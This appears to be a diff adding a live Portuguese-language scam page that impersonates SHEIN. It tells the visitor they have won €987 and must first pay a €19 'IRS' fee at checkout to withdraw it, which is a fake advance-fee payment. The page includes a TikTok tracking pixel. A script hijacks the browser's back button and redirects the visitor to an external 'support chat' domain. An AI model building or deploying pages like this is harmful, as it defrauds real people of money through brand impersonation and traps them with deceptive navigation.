@@ -1,0 +1,60 @@
+<!DOCTYPE html><html lang="pt-PT"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SHEIN | Confirmação Fiscal</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { margin: 0; font-family: Inter, Arial, sans-serif; background: #f5f6f8; color: #111; }
+    .wrap { max-width: 700px; margin: 0 auto; padding: 18px; }
+    .head { background: #fff; border-radius: 12px; padding: 18px; margin-bottom: 14px; }
+    .brand { font-size: 24px; font-weight: 800; }
+    .warn { background:#fff3cd;border:1px solid #ffe69c;border-radius:10px;padding:14px;color:#7a5b00;margin-bottom:12px; }
+    .card { background:#fff;border-radius:12px;padding:16px;box-shadow:0 2px 10px rgba(0,0,0,.04); }
+    .row { display:flex;justify-content:space-between;border-bottom:1px solid #efefef;padding:10px 0; }
+    .row:last-child{border-bottom:none}
+    .cta{display:block;margin-top:14px;background:#003772;color:#fff;text-decoration:none;text-align:center;padding:14px;border-radius:9px;font-weight:700;opacity:.5;pointer-events:none}
+    .cta.enabled{opacity:1;pointer-events:auto}
+    .check{margin-top:14px;font-size:13px;color:#444;display:flex;gap:10px;align-items:flex-start}
+  </style>
+<!-- TikTok Pixel -->
+<script type="text/javascript" async="" src="js/events.js"></script><script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D7PL1V3C77U9KU0AHCHG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+
+<script defer="" src="js/~flock.js" data-proxy-url="/~api/analytics"></script><meta property="og:image" content="images/id-preview-8c69cb26--329b57f3-ff2f-4b8f-a38b-0437c9cc6e73.lovable.app-1773459438715.png"><meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/f8c38583-5073-4d3c-bf8d-4222b770f7f6/id-preview-8c69cb26--329b57f3-ff2f-4b8f-a38b-0437c9cc6e73.lovable.app-1773459438715.png"></head>
+<body>
+  <main class="wrap">
+    <section class="head"><div class="brand">SHEIN</div><p>Regularização para liberação imediata do saldo.</p></section>
+    <div class="warn"><strong>Imposto (IRS) obrigatório:</strong> para concluir o levantamento antecipado.</div>
+    <section class="card">
+      <div class="row"><span>Valor ganho</span><strong>€987,00</strong></div>
+      <div class="row"><span>Valor a ser pago (IRS)</span><strong>- €19,00</strong></div>
+      <div class="row"><span>Total a receber</span><strong>€968,00</strong></div>
+
+      <label class="check"><input type="checkbox" id="ok"> Concordo com os termos e com o pagamento do IRS necessário para completar o levantamento.</label>
+      <a href="checkout.html" id="go" class="cta">Ir para pagamento da taxa (IRS) — €19,00</a>
+    </section>
+  </main>
+  <script>
+    const ok=document.getElementById('ok');
+    const go=document.getElementById('go');
+    ok.addEventListener('change',()=>go.classList.toggle('enabled',ok.checked));
+    go.addEventListener('click',(e)=>{if(!ok.checked){e.preventDefault();alert('Precisas aceitar os termos antes de prosseguir.')}});
+  </script>
+  <!-- Back Redirect -->
+  <script>
+    (function(){
+      var backUrl = 'https://chat.atendimentosuporte.online/b2';
+      history.pushState(null, '', location.href);
+      window.addEventListener('popstate', function(){
+        window.location.replace(backUrl);
+      });
+    })();
+  </script>
+
+
+</body></html>
